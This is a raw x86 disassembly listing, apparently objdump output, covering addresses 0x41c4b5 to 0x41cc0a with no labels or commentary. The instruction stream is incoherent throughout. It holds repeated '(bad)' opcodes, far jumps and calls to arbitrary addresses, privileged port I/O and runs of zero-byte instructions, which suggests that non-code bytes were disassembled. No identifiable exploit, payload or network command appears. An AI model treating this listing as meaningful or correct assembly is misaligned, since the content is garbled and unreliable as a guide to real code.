  41c4b5:	rcr    BYTE PTR [ebp+edi*8-0xe55a43b],0x39
  41c4bd:	ret    
  41c4be:	neg    DWORD PTR [eax+0x73a257fc]
  41c4c4:	push   ss
  41c4c5:	call   0x2fd030
  41c4ca:	mov    dl,0x73
  41c4cc:	(bad)  
  41c4cd:	out    0x5e,eax
  41c4cf:	or     ebp,esi
  41c4d1:	inc    DWORD PTR [edx-0x4917d18d]
  41c4d7:	or     ebp,esi
  41c4d9:	push   DWORD PTR [edx+0x73]
  41c4dc:	xor    ch,al
  41c4de:	outs   dx,BYTE PTR ds:[esi]
  41c4df:	or     ebp,esi
  41c4e1:	jmp    DWORD PTR [edx+0x73]
  41c4e4:	ss call 0x41c4ea
  41c4ea:	add    BYTE PTR [eax-0x20000888],dl
  41c4f0:	xchg   esp,eax
  41c4f1:	dec    edi
  41c4f2:	xor    al,ch
  41c4f4:	xor    bh,0xff
  41c4f7:	iret   
  41c4f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4f9:	iret   
  41c4fa:	out    0xb6,eax
  41c4fc:	mov    dl,0xc0
  41c4fe:	cld    
  41c4ff:	or     edi,DWORD PTR [edx]
  41c501:	es or  ecx,0x77
  41c505:	sbb    BYTE PTR [edi-0x48],cl
  41c508:	sbb    eax,0x94a7fd36
  41c50d:	inc    eax
  41c50e:	dec    esp
  41c50f:	adc    eax,0xb0e46e9
  41c514:	popa   
  41c515:	retf   
  41c516:	push   ecx
  41c517:	call   0x98f3:0x5789120b
  41c51e:	in     eax,0x90
  41c520:	or     ebp,DWORD PTR [ebx+0x4d]
  41c523:	int3   
  41c524:	jo     0x41c4fd
  41c526:	inc    ebp
  41c527:	shl    bh,1
  41c529:	imul   edi,DWORD PTR [edi],0xffffff90
  41c52c:	loope  0x41c4f7
  41c52e:	jb     0x41c5a6
  41c530:	or     edx,DWORD PTR [edx]
  41c532:	and    DWORD PTR [edi+edi*4+0x23],0x86a4e653
  41c53a:	and    edx,DWORD PTR [eax]
  41c53c:	or     edx,DWORD PTR [edx]
  41c53e:	add    bh,ah
  41c540:	xchg   edx,eax
  41c541:	es and al,0x94
  41c544:	mov    ds:0x8a7c244e,al
  41c549:	sar    ah,0x27
  41c54c:	cmp    BYTE PTR [edi],0xd
  41c54f:	add    BYTE PTR [eax],al
  41c551:	add    BYTE PTR [eax],al
  41c553:	add    BYTE PTR [edi],dl
  41c555:	or     dl,BYTE PTR [ebx]
  41c557:	add    BYTE PTR [eax+0x102396a4],dl
  41c55d:	or     edx,DWORD PTR [edx]
  41c55f:	add    bl,al
  41c561:	les    ebp,FWORD PTR [ebp+0x53]
  41c564:	mov    ah,0x37
  41c566:	add    eax,edi
  41c568:	or     DWORD PTR [edx+0x2b7827d3],esi
  41c56e:	mov    ah,0x27
  41c570:	je     0x41c59d
  41c572:	mov    WORD PTR [edi],fs
  41c574:	pusha  
  41c575:	sub    edi,DWORD PTR [edi+eiz*1-0xca0f5a4]
  41c57c:	into   
  41c57d:	sbb    BYTE PTR [ebx+0x38],bh
  41c580:	ins    BYTE PTR es:[edi],dx
  41c581:	loop   0x41c514
  41c583:	add    eax,0xf27b0a67
  41c588:	mov    dh,0x18
  41c58a:	arpl   WORD PTR [edi+0x3f82e73],ax
  41c590:	nop
  41c591:	and    DWORD PTR [edi],0x5e
  41c594:	xchg   ecx,eax
  41c595:	daa    
  41c596:	or     al,0x28
  41c598:	sbb    al,0xa
  41c59a:	inc    ebp
  41c59b:	outs   dx,BYTE PTR ds:[esi]
  41c59c:	mov    ds,WORD PTR [eax]
  41c59e:	jae    0x41c563
  41c5a0:	xchg   esp,eax
  41c5a1:	imul   eax,DWORD PTR cs:0x8f78b290,0xffffffb3
  41c5a9:	cs clc 
  41c5ab:	add    edx,DWORD PTR [eax+0x2c86fcaa]
  41c5b1:	mov    ch,0xf7
  41c5b3:	add    ebp,edx
  41c5b5:	stos   BYTE PTR es:[edi],al
  41c5b6:	dec    edx
  41c5b7:	aas    
  41c5b8:	add    BYTE PTR [eax],al
  41c5ba:	add    BYTE PTR [eax],al
  41c5bc:	add    BYTE PTR [edx+eax*4-0x41b2cbfa],ch
  41c5c3:	adc    edi,edx
  41c5c5:	xchg   DWORD PTR [edx+0x2d8bc778],esi
  41c5cb:	mov    eax,0xfa291300
  41c5d0:	add    edx,DWORD PTR [eax+0x73877a81]
  41c5d6:	cs clc 
  41c5d8:	add    edx,DWORD PTR [eax+0xb05d182]
  41c5de:	sbb    ebx,DWORD PTR [bx+si-0x8]
  41c5e2:	(bad)  
  41c5e3:	jno    0x41c5e7
  41c5e5:	nop
  41c5e6:	sub    DWORD PTR [edi],ecx
  41c5e8:	lods   eax,DWORD PTR ds:[esi]
  41c5e9:	mov    bh,0xce
  41c5eb:	xchg   ebx,eax
  41c5ec:	sub    DWORD PTR [eax-0x6c1482d2],edx
  41c5f2:	mov    dl,0x99
  41c5f4:	dec    ebp
  41c5f5:	scas   eax,DWORD PTR es:[edi]
  41c5f6:	xor    cl,BYTE PTR [edi]
  41c5f8:	jmp    0xdf3df990
  41c5fd:	emms   
  41c5ff:	adc    cl,ch
  41c601:	xchg   ebx,eax
  41c602:	addr16 fwait
  41c604:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c605:	outs   dx,DWORD PTR ds:[esi]
  41c606:	mov    dh,0x3e
  41c608:	adc    DWORD PTR [edx+0x5fc55b2b],0xa
  41c60f:	jae    0x25d978aa
  41c615:	js     0x41c5e1
  41c617:	xchg   ebx,eax
  41c618:	test   eax,0xeb51339f
  41c61d:	xchg   ebx,eax
  41c61e:	mov    dl,0x27
  41c620:	and    eax,0x0
  41c625:	add    BYTE PTR [eax-0x6b9ae246],bh
  41c62b:	mov    ah,0xe
  41c62d:	jmp    0x594f1f6
  41c632:	fs addr16 fwait
  41c635:	sub    eax,0x6c3edab8
  41c63a:	ror    dh,1
  41c63c:	bound  eax,QWORD PTR [ecx-0x16efbfda]
  41c642:	aam    0x73
  41c644:	xor    cl,cl
  41c646:	sbb    BYTE PTR [edi+0x1e],dl
  41c649:	gs xor al,0xb1
  41c64c:	push   cs
  41c64d:	jmp    0xd574620c
  41c652:	or     BYTE PTR [esi],dl
  41c654:	push   ds
  41c655:	ins    DWORD PTR es:[edi],dx
  41c656:	nop
  41c657:	mov    ah,0xe
  41c659:	jmp    0xbddd7827
  41c65e:	ja     0x41c6d6
  41c660:	inc    edi
  41c661:	pusha  
  41c662:	pusha  
  41c663:	into   
  41c664:	add    BYTE PTR es:[eax+0x613c32e2],al
  41c66b:	dec    edx
  41c66c:	push   ds
  41c66d:	add    ecx,ebp
  41c66f:	xor    DWORD PTR [edx+0xeae6d24],edx
  41c675:	add    BYTE PTR [eax],ch
  41c677:	jecxz  0x41c612
  41c679:	inc    esp
  41c67a:	int    0x92
  41c67c:	lea    esi,ds:0x5ae862cf
  41c683:	test   esp,ebp
  41c685:	(bad)  
  41c686:	cmp    al,0xee
  41c688:	popa   
  41c689:	pop    ebx
  41c68a:	add    BYTE PTR [eax],al
  41c68c:	add    BYTE PTR [eax],al
  41c68e:	add    BYTE PTR [edx+0x32],al
  41c691:	xor    al,BYTE PTR [ecx+ebp*4+0x70850eb2]
  41c698:	pop    ss
  41c699:	xchg   edx,eax
  41c69a:	into   
  41c69b:	mov    eax,0xb0830eb2
  41c6a0:	sbb    BYTE PTR [ebx],bl
  41c6a2:	(bad)  
  41c6a3:	in     al,dx
  41c6a4:	lods   eax,DWORD PTR ds:[esi]
  41c6a5:	push   cs
  41c6a6:	add    BYTE PTR [edx],ch
  41c6a8:	neg    DWORD PTR [ecx]
  41c6aa:	push   ecx
  41c6ab:	test   eax,0xf45a1778
  41c6b0:	aad    0x32
  41c6b2:	push   esp
  41c6b3:	push   ecx
  41c6b4:	(bad)  
  41c6b5:	fwait
  41c6b6:	add    DWORD PTR [ecx+0x2b],ebp
  41c6b9:	scas   al,BYTE PTR es:[edi]
  41c6ba:	paddb  mm6,QWORD PTR ds:0x3379ffed
  41c6c1:	inc    edx
  41c6c2:	and    al,0x41
  41c6c4:	xor    ebx,DWORD PTR [edx+0x24]
  41c6c7:	test   eax,0x390a0df6
  41c6cc:	mov    dl,0x91
  41c6ce:	shl    BYTE PTR [esi],0x2b
  41c6d1:	add    DWORD PTR [ecx],0x29
  41c6d4:	mov    dl,0x25
  41c6d6:	pop    esp
  41c6d7:	dec    ebp
  41c6d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6d9:	sbb    eax,DWORD PTR [edi+0xeaea4]
  41c6df:	mov    edx,0x90383265
  41c6e4:	jl     0x41c6d2
  41c6e6:	test   BYTE PTR [edx],dl
  41c6e8:	or     edx,DWORD PTR [edx]
  41c6ea:	add    BYTE PTR [esi],al
  41c6ec:	dec    eax
  41c6ed:	ss sbb al,0x91
  41c6f0:	pop    edi
  41c6f1:	adc    eax,0x6a
  41c6f6:	add    BYTE PTR [eax],al
  41c6f8:	mov    ds:0xeb08483d,eax
  41c6fd:	push   cs
  41c6fe:	dec    eax
  41c6ff:	adc    al,0x4e
  41c701:	inc    ecx
  41c702:	adc    eax,0xd17c9758
  41c707:	xchg   BYTE PTR [eax+ebp*8],dl
  41c70a:	xchg   ebp,eax
  41c70b:	call   edi
  41c70d:	or     edx,DWORD PTR [ecx]
  41c70f:	lds    ebx,FWORD PTR ds:0xd801105f
  41c715:	ret    
  41c716:	pusha  
  41c717:	jecxz  0x41c6a9
  41c719:	or     ebp,DWORD PTR [ecx-0x19]
  41c71c:	or     DWORD PTR [eax-0xeae3cb],ebx
  41c722:	jmp    0x41c6a7
  41c724:	pop    edx
  41c725:	or     dl,BYTE PTR [edx]
  41c727:	add    BYTE PTR [ebx],cl
  41c729:	push   edi
  41c72a:	push   0xec56a8cd
  41c72f:	dec    BYTE PTR [edi+0xc2386a0]
  41c735:	or     edx,DWORD PTR [edx]
  41c737:	add    bh,ah
  41c739:	pop    esp
  41c73a:	inc    edi
  41c73b:	and    al,0xac
  41c73d:	or     ch,al
  41c73f:	push   ebp
  41c740:	outs   dx,DWORD PTR ds:[esi]
  41c741:	push   ss
  41c742:	ds push ss
  41c744:	ror    BYTE PTR [ebx],1
  41c746:	addr16 inc ebx
  41c748:	mov    ah,0xfb
  41c74a:	mov    es,ebx
  41c74c:	test   BYTE PTR [eax],cl
  41c74e:	ret    
  41c74f:	jg     0x41c6d9
  41c751:	cld    
  41c752:	inc    ebp
  41c753:	add    al,0x4e
  41c755:	or     eax,0xdf0b460b
  41c75a:	add    BYTE PTR ss:[eax],0x0
  41c75e:	add    BYTE PTR [eax],al
  41c760:	add    BYTE PTR [eax-0x3faaedf5],dl
  41c766:	mov    dl,0xad
  41c768:	int3   
  41c769:	xor    BYTE PTR [esi-0x1b],0x43
  41c76d:	nop
  41c76e:	xor    DWORD PTR [eax+eax*1],edi
  41c771:	xchg   ecx,eax
  41c772:	sbb    eax,0xb417fbd2
  41c777:	bound  edi,QWORD PTR [eax]
  41c779:	lods   al,BYTE PTR ds:[esi]
  41c77a:	outs   dx,BYTE PTR ds:[esi]
  41c77b:	scas   al,BYTE PTR es:[edi]
  41c77c:	sbb    BYTE PTR [ebx],al
  41c77e:	or     dl,BYTE PTR [edi+0x4b14f6fd]
  41c784:	mov    BYTE PTR [ebx-0x6ffc07d2],dh
  41c78a:	and    DWORD PTR [edi-0x5031ac82],0x33
  41c791:	or     esp,DWORD PTR [esi-0x2d]
  41c794:	push   edi
  41c795:	mov    eax,0x90037041
  41c79a:	sub    DWORD PTR [eax],edx
  41c79c:	jnp    0x41c7d9
  41c79e:	into   
  41c79f:	retf   
  41c7a0:	xchg   BYTE PTR [ebp+ebx*4-0x32048710],dh
  41c7a7:	jnp    0x41c7ac
  41c7a9:	nop
  41c7aa:	mov    dl,0x72
  41c7ac:	ficomp WORD PTR [esp+ebp*4]
  41c7af:	outs   dx,BYTE PTR ds:[esi]
  41c7b0:	das    
  41c7b1:	ins    BYTE PTR es:[edi],dx
  41c7b2:	mov    esi,0xaef9d870
  41c7b7:	bound  esi,QWORD PTR [edi]
  41c7b9:	lods   al,BYTE PTR ds:[esi]
  41c7ba:	jbe    0x41c7ea
  41c7bc:	fdivr  st(0),st
  41c7be:	mov    ds:0x2f0b03f6,eax
  41c7c3:	adc    al,0x88
  41c7c5:	add    BYTE PTR [eax],al
  41c7c7:	add    BYTE PTR [eax],al
  41c7c9:	add    BYTE PTR [edi+0x14],ch
  41c7cc:	clc    
  41c7cd:	xor    al,al
  41c7cf:	and    eax,0x82f02834
  41c7d4:	jb     0x41c815
  41c7d6:	lods   al,BYTE PTR ds:[esi]
  41c7d7:	sahf   
  41c7d8:	(bad)  
  41c7d9:	xor    DWORD PTR [eax],ebp
  41c7db:	mov    dl,0xf7
  41c7dd:	jp     0x41c7f2
  41c7df:	iret   
  41c7e0:	ja     0x41c7e5
  41c7e2:	nop
  41c7e3:	mov    dl,0xe
  41c7e5:	ins    BYTE PTR es:[edi],dx
  41c7e6:	push   ebx
  41c7e7:	mov    al,ds:0xd01f6200
  41c7ec:	xchg   edx,eax
  41c7ed:	jmp    0x9dd97a85
  41c7f2:	ja     0x41c822
  41c7f4:	psubsw mm2,QWORD PTR [ebx+0xdceee2f]
  41c7fb:	sub    eax,0x140c0d8b
  41c800:	out    dx,al
  41c801:	jmp    0x6d74ff80
  41c806:	xchg   ebx,eax
  41c807:	mov    dl,0xe
  41c809:	pop    esp
  41c80a:	push   edi
  41c80b:	into   
  41c80c:	xor    bh,BYTE PTR [ecx-0x3acd909a]
  41c812:	mov    ds:0x43cd5b27,eax
  41c817:	or     dh,BYTE PTR [esi]
  41c819:	jo     0x41c7ad
  41c81b:	mov    dl,0x92
  41c81d:	sub    DWORD PTR [esi-0x52],ebx
  41c820:	cdq    
  41c821:	add    bl,al
  41c823:	stos   DWORD PTR es:[edi],eax
  41c824:	cdq    
  41c825:	jne    0x41c896
  41c827:	into   
  41c828:	cdq    
  41c829:	lea    esi,[edi-0x2e]
  41c82c:	inc    ebp
  41c82d:	cmp    al,BYTE PTR [eax]
  41c82f:	add    BYTE PTR [eax],al
  41c831:	add    BYTE PTR [eax],al
  41c833:	fistp  DWORD PTR [edi+0x671f2932]
  41c839:	xor    dl,BYTE PTR [ecx]
  41c83b:	retf   
  41c83c:	pop    edi
  41c83d:	xor    edi,DWORD PTR [ecx-0x6c]
  41c840:	mov    dl,0xe
  41c842:	(bad)  
  41c843:	and    bh,cl
  41c845:	jle    0x41c830
  41c847:	xchg   ebx,eax
  41c848:	mov    dl,0x43
  41c84a:	mov    dh,0xe0
  41c84c:	into   
  41c84d:	cmp    dl,BYTE PTR [edi]
  41c84f:	out    dx,eax
  41c850:	lahf   
  41c851:	xor    ah,ch
  41c853:	mov    eax,ds:0x97c56315
  41c858:	adc    eax,0x88a3cd63
  41c85d:	sbb    BYTE PTR [ebx],dh
  41c85f:	ins    BYTE PTR es:[edi],dx
  41c860:	retf   0xe
  41c863:	cmp    DWORD PTR [edi-0x64b1769],ebp
  41c869:	pusha  
  41c86a:	adc    eax,0x64f658b2
  41c86f:	sbb    ch,BYTE PTR [esi-0x99d74f2]
  41c875:	dec    eax
  41c876:	jecxz  0x41c8a1
  41c878:	scas   eax,DWORD PTR es:[edi]
  41c879:	xchg   edi,eax
  41c87a:	iret   
  41c87b:	shl    eax,1
  41c87d:	out    dx,eax
  41c87e:	add    cl,bh
  41c880:	xchg   ebx,eax
  41c881:	shr    bl,1
  41c883:	sti    
  41c884:	mov    ebx,0xca1f5fce
  41c889:	inc    edi
  41c88a:	and    DWORD PTR [ebp-0x6f72f86],0x2b
  41c891:	cli    
  41c892:	cmp    BYTE PTR [edi+0x82eeb1],al
  41c898:	add    BYTE PTR [eax],al
  41c89a:	add    BYTE PTR [eax],al
  41c89c:	xor    eax,0x1452edaf
  41c8a1:	loope  0x41c8e6
  41c8a3:	mov    DWORD PTR ds:0xfd88feb3,eax
  41c8a9:	mov    dl,0x2
  41c8ab:	jne    0x41c8b4
  41c8ad:	sub    DWORD PTR [esi-0x7e],esp
  41c8b0:	in     eax,0xae
  41c8b2:	inc    esp
  41c8b3:	inc    esp
  41c8b5:	(bad)  
  41c8b6:	(bad)  
  41c8b7:	aas    
  41c8b8:	mov    ecx,0x2be01100
  41c8bd:	ror    DWORD PTR [esi],cl
  41c8bf:	add    DWORD PTR [esp+eax*1],esi
  41c8c2:	test   BYTE PTR [edx+ebx*2-0x3],0xea
  41c8c7:	test   BYTE PTR [ecx],bh
  41c8c9:	sbb    BYTE PTR ds:0x90166c80,0x44
  41c8d0:	imul   esi,DWORD PTR [edi+0x385505d3],0x8eab0052
  41c8da:	sub    al,0x0
  41c8dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8dd:	std    
  41c8de:	add    al,ch
  41c8e0:	nop
  41c8e1:	or     eax,0xc01b0052
  41c8e6:	cs push esp
  41c8e8:	or     eax,0x3983e939
  41c8ed:	sbb    edx,DWORD PTR [edx]
  41c8ef:	add    BYTE PTR [ebx],cl
  41c8f1:	test   al,0x2e
  41c8f3:	pop    eax
  41c8f4:	adc    eax,0x358de925
  41c8f9:	sbb    edx,DWORD PTR [edx]
  41c8fb:	add    BYTE PTR [ebx],dl
  41c8fd:	lock or eax,0x50
  41c903:	add    BYTE PTR [eax],al
  41c905:	mov    esi,gs
  41c907:	jecxz  0x41c891
  41c909:	push   esp
  41c90a:	mov    bh,0x26
  41c90c:	or     al,0x2b
  41c90f:	jmp    0x125ca296
  41c914:	add    BYTE PTR [edx+0x1c],ch
  41c917:	aaa    
  41c918:	jmp    0x249765a8
  41c91d:	inc    eax
  41c91e:	sbb    al,0xe9
  41c920:	or     cl,0x1a
  41c923:	adc    al,BYTE PTR [eax]
  41c925:	or     esp,DWORD PTR [eax+0xe]
  41c928:	dec    esp
  41c929:	adc    ah,ah
  41c92b:	push   eax
  41c92c:	or     eax,0x12780d
  41c931:	nop
  41c932:	dec    esp
  41c933:	mov    DWORD PTR [edx+0x2a],0xaf004c23
  41c93a:	inc    esi
  41c93b:	or     al,BYTE PTR [ecx+0x12d71b4c]
  41c941:	sbb    BYTE PTR ds:0x5c0d0052,cl
  41c947:	aas    
  41c948:	or     DWORD PTR [ebx],ebx
  41c94a:	push   ebx
  41c94b:	retf   
  41c94c:	push   0x73
  41c94e:	clc    
  41c94f:	xlat   BYTE PTR ds:[ebx]
  41c950:	mov    BYTE PTR [eax+0x7e3114e4],al
  41c956:	sahf   
  41c957:	ror    BYTE PTR [esp+edx*1],0x6b
  41c95b:	adc    DWORD PTR [eax],eax
  41c95d:	nop
  41c95e:	mov    dl,0x60
  41c960:	inc    eax
  41c961:	mov    ah,0xa6
  41c963:	pop    esi
  41c964:	add    cl,BYTE PTR [ecx]
  41c966:	jbe    0x41c943
  41c968:	repz add BYTE PTR [eax],al
  41c96b:	add    BYTE PTR [eax],al
  41c96d:	add    BYTE PTR [esi],dl
  41c96f:	mov    al,ds:0x87919bf3
  41c974:	in     al,0x7c
  41c976:	pusha  
  41c977:	cmp    eax,0xba93dcbd
  41c97c:	fs leave 
  41c97e:	sbb    BYTE PTR [edx],cl
  41c980:	jno    0x41c9c2
  41c982:	ins    BYTE PTR es:[edi],dx
  41c983:	mov    ds:0x3d884a5e,al
  41c988:	int3   
  41c989:	pop    ds
  41c98a:	mov    al,0x3b
  41c98c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c98d:	div    DWORD PTR [edi]
  41c98f:	mov    dh,0xc3
  41c991:	add    DWORD PTR [ecx],ebx
  41c993:	jbe    0x41c9b0
  41c995:	sub    cl,ch
  41c997:	mov    esp,0x6eac3860
  41c99c:	jo     0x41c94f
  41c99e:	div    eax
  41c9a0:	hlt    
  41c9a1:	enter  0xc4e4,0x1e
  41c9a5:	jnp    0x41c9fc
  41c9a7:	mov    ds:0xcb7c4a5e,al
  41c9ac:	mov    ch,0xfb
  41c9ae:	pushf  
  41c9af:	lods   al,BYTE PTR ss:[esi]
  41c9b1:	add    dl,BYTE PTR [eax+0x3dc97ab2]
  41c9b7:	mov    edx,0x3684c472
  41c9bc:	fadd   DWORD PTR [edx]
  41c9be:	nop
  41c9bf:	mov    dl,0x78
  41c9c1:	dec    edx
  41c9c2:	xchg   esp,eax
  41c9c3:	mov    ebx,0xa833e660
  41c9c8:	aaa    
  41c9c9:	add    al,0x16
  41c9cb:	aad    0x51
  41c9cd:	cmc    
  41c9ce:	sbb    ah,BYTE PTR [edi+0x13]
  41c9d1:	call   0x41c9d6
  41c9d6:	add    dh,bl
  41c9d8:	sbb    bh,BYTE PTR [edi]
  41c9da:	idiv   DWORD PTR [esi+0x10]
  41c9dd:	jnp    0x41ca1e
  41c9df:	lods   al,BYTE PTR ds:[esi]
  41c9e0:	stos   BYTE PTR es:[edi],al
  41c9e1:	push   cs
  41c9e2:	inc    ebx
  41c9e3:	ins    BYTE PTR es:[edi],dx
  41c9e4:	pcmpgtw mm4,mm1
  41c9e7:	mov    ds:0x1f6ac20d,eax
  41c9ec:	mov    esp,0xb6c6a993
  41c9f1:	mov    fs,WORD PTR [edi]
  41c9f3:	test   BYTE PTR [edi],cl
  41c9f5:	xchg   ecx,eax
  41c9f6:	mov    WORD PTR [ebx+eax*4-0x292895bf],cs
  41c9fd:	jbe    0x41c9c7
  41c9ff:	iret   
  41ca00:	jle    0x41ca7a
  41ca02:	out    0xa6,eax
  41ca04:	arpl   WORD PTR [edx],si
  41ca06:	sar    DWORD PTR [edx+0x1a],0x29
  41ca0a:	hlt    
  41ca0b:	xchg   edx,eax
  41ca0c:	mov    dl,0x99
  41ca0e:	fnsave [edi-0x6a]
  41ca11:	js     0x41ca1b
  41ca13:	xchg   DWORD PTR [ebx+0x32],esi
  41ca16:	add    DWORD PTR [ebp+eiz*2-0xbebe513],edi
  41ca1d:	sbb    ah,BYTE PTR [ebx+edx*8-0x7c]
  41ca21:	cmp    DWORD PTR [edx+0x57],ebp
  41ca24:	(bad)  
  41ca25:	jbe    0x41ca2f
  41ca27:	inc    eax
  41ca28:	stos   DWORD PTR es:[edi],eax
  41ca29:	cwde   
  41ca2a:	scas   al,BYTE PTR es:[edi]
  41ca2b:	mov    dl,0xce
  41ca2d:	sub    DWORD PTR [ebp-0x62d1341f],edx
  41ca33:	(bad)
  41ca36:	(bad)  
  41ca37:	(bad)  
  41ca38:	retf   
  41ca39:	sbb    eax,DWORD PTR [edi+0x0]
  41ca3f:	add    BYTE PTR [ebp-0x71d65342],bh
  41ca45:	or     eax,0x8393e90f
  41ca4a:	adc    eax,0xfaa5126
  41ca4f:	jmp    0x26267ce7
  41ca54:	jo     0x41c9f8
  41ca56:	push   ss
  41ca57:	(bad)  
  41ca58:	rcl    dh,1
  41ca5a:	jp     0x41cabc
  41ca5c:	(bad)  
  41ca5d:	scas   al,BYTE PTR es:[edi]
  41ca5e:	bound  eax,QWORD PTR [eax]
  41ca60:	test   BYTE PTR [ecx+edx*2+0x538db924],cl
  41ca67:	and    dl,dh
  41ca69:	jb     0x41ca9d
  41ca6b:	je     0x41cabf
  41ca6d:	sbb    edx,DWORD PTR [edi-0x709cb2b4]
  41ca73:	retf   0xedf6
  41ca76:	lds    eax,FWORD PTR [esi]
  41ca78:	not    DWORD PTR es:[esi-0x7080b2b4]
  41ca7f:	retf   0x8d16
  41ca82:	push   ebx
  41ca83:	and    BYTE PTR [ecx],ah
  41ca85:	dec    ebp
  41ca86:	adc    al,0xff
  41ca88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca89:	cmp    esi,DWORD PTR [esi]
  41ca8b:	imul   ebp,DWORD PTR [ebp-0x4a],0x3f
  41ca8f:	mov    edi,ebp
  41ca91:	scas   al,BYTE PTR es:[edi]
  41ca92:	jmp    0x41caa9
  41ca94:	mov    ecx,0x26002e04
  41ca99:	jb     0x41cb12
  41ca9b:	inc    esp
  41ca9c:	stc    
  41ca9d:	mov    ebx,edx
  41ca9f:	call   0x2cdbe3
  41caa4:	add    BYTE PTR [eax],al
  41caa6:	add    BYTE PTR [eax],al
  41caa8:	add    BYTE PTR [eax],bl
  41caaa:	mov    ebx,ds
  41caac:	call   0x2cbb5d
  41cab1:	jb     0x41cafb
  41cab3:	inc    ebx
  41cab4:	call   0x2cb88b
  41cab9:	jg     0x41ca8b
  41cabb:	add    ch,BYTE PTR ds:[eax+eiz*1]
  41cabf:	xchg   edi,eax
  41cac0:	push   esi
  41cac1:	mov    cl,0x68
  41cac3:	push   cs
  41cac4:	(bad)  
  41cac5:	aas    
  41cac6:	pop    es
  41cac7:	pop    ds
  41cac8:	leave  
  41cac9:	mov    eax,ds:0xb900e015
  41cace:	mov    gs,WORD PTR [ebp+0x5c32ad74]
  41cad4:	push   eax
  41cad5:	stos   DWORD PTR es:[edi],eax
  41cad6:	fist   WORD PTR [edi-0x7533e32]
  41cadc:	call   DWORD PTR [eax-0x2032971c]
  41cae2:	repz xchg esp,eax
  41cae4:	jmp    0xe39d:0xfd20f57f
  41caeb:	fistp  QWORD PTR [edi]
  41caed:	nop
  41caee:	nop
  41caef:	stos   DWORD PTR es:[edi],eax
  41caf0:	call   0x8655d73
  41caf5:	or     esi,eax
  41caf7:	loop   0x41ca81
  41caf9:	inc    esi
  41cafa:	and    al,0xfd
  41cafc:	stc    
  41cafd:	dec    edi
  41cafe:	and    eax,0x2938cd69
  41cb03:	repnz (bad) 
  41cb05:	aas    
  41cb06:	dec    ecx
  41cb07:	rcr    BYTE PTR [esi+edx*8-0x52],cl
  41cb0b:	cmp    DWORD PTR [ecx+0x0],eax
  41cb11:	add    BYTE PTR [esp+eax*2-0x30],dl
  41cb15:	sub    edx,DWORD PTR [eax-0x38a9e058]
  41cb1b:	adc    BYTE PTR [ebp+0x24],0x7c
  41cb1f:	add    dl,0x82
  41cb22:	(bad)  
  41cb24:	in     al,0x88
  41cb26:	dec    esi
  41cb27:	pop    ds
  41cb28:	sbb    DWORD PTR [ebp-0x6c],eax
  41cb2b:	dec    edi
  41cb2c:	in     eax,dx
  41cb2d:	xor    eax,edx
  41cb2f:	bound  esi,QWORD PTR [edi+edi*8-0x11]
  41cb33:	sbb    ebx,DWORD PTR [ecx+0x12577b27]
  41cb39:	push   ecx
  41cb3a:	or     DWORD PTR [esi+0x1a],edx
  41cb3d:	std    
  41cb3e:	jge    0x41caeb
  41cb40:	fistp  QWORD PTR [edi]
  41cb42:	nop
  41cb43:	xor    edx,DWORD PTR [edx+0x69]
  41cb46:	dec    esp
  41cb47:	sbb    ebp,DWORD PTR [ecx-0x33]
  41cb4a:	test   al,0x9f
  41cb4c:	ret    
  41cb4d:	cld    
  41cb4e:	mov    bh,0x97
  41cb50:	shl    DWORD PTR [edx+0x71],1
  41cb53:	xchg   ecx,eax
  41cb54:	sub    edi,DWORD PTR [esp+eiz*2]
  41cb57:	sbb    bl,BYTE PTR [esi+0x1a]
  41cb5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb5b:	mov    dl,0x3d
  41cb5d:	xor    al,0x92
  41cb5f:	xchg   ebx,esp
  41cb61:	jg     0x41cbb2
  41cb63:	xchg   esp,ebp
  41cb65:	add    BYTE PTR ds:0x8f4ef6ab,0x37
  41cb6c:	aad    0x50
  41cb6e:	mov    esi,DWORD PTR [ecx]
  41cb70:	sub    eax,0xfc849000
  41cb75:	js     0x41cb77
  41cb77:	add    BYTE PTR [eax],al
  41cb79:	add    BYTE PTR [eax],al
  41cb7b:	push   ebp
  41cb7c:	sbb    dh,BYTE PTR [ecx-0x2b]
  41cb7f:	pop    esp
  41cb80:	or     eax,0x1a82c529
  41cb85:	jmp    0x9234:0x3e049043
  41cb8c:	xchg   DWORD PTR [edx],esi
  41cb8e:	adc    DWORD PTR ds:0xbe3c15cb,edi
  41cb94:	lds    ebp,FWORD PTR [eax+0x3b9c18a8]
  41cb9a:	add    DWORD PTR [ecx],edi
  41cb9c:	cmp    DWORD PTR [esi+0x74bea2c5],ecx
  41cba2:	dec    edi
  41cba3:	mov    BYTE PTR [eax+0x193bdbf3],bl
  41cba9:	inc    ebp
  41cbaa:	lds    edx,FWORD PTR [ebx]
  41cbac:	bnd ret 0x8ef
  41cbb0:	(bad)  
  41cbb1:	aas    
  41cbb2:	dec    esp
  41cbb3:	icebp  
  41cbb4:	or     al,0x2d
  41cbb6:	ja     0x41cc15
  41cbb8:	jb     0x41cb46
  41cbba:	js     0x41cba2
  41cbbc:	or     ecx,DWORD PTR [eax+0x1314cff]
  41cbc2:	in     al,dx
  41cbc3:	dec    esp
  41cbc4:	xor    DWORD PTR [ecx],edi
  41cbc6:	in     al,dx
  41cbc7:	mov    BYTE PTR [edi+ebp*4+0xe38d951],cl
  41cbce:	fdiv   QWORD PTR [ebx+eax*1+0x15]
  41cbd2:	lds    edx,FWORD PTR [eax]
  41cbd4:	xchg   esp,eax
  41cbd5:	iret   
  41cbd6:	add    esp,eax
  41cbd8:	mov    dl,0xe
  41cbda:	xchg   esi,eax
  41cbdb:	ins    DWORD PTR es:[edi],dx
  41cbdc:	imul   ecx,DWORD PTR [ecx+0x2b],0x0
  41cbe3:	add    BYTE PTR [eax-0x408dbc4e],dl
  41cbe9:	cmp    DWORD PTR [ebp+ebp*8+0x10],eax
  41cbed:	sbb    BYTE PTR [ebx],ah
  41cbef:	cmp    dh,BYTE PTR [esi+0x12b09965]
  41cbf5:	or     ch,dh
  41cbf7:	(bad)  
  41cbf8:	dec    esp
  41cbf9:	(bad)  
  41cbfa:	sbb    eax,0xee0c1766
  41cbff:	jmp    0x6a583cec
  41cc04:	mov    esi,0xb66a0f12
  41cc09:	push   ds
  41cc0a:	sha256rnds2 xmm6,XMMWORD PTR [eax-0xe],xmm0
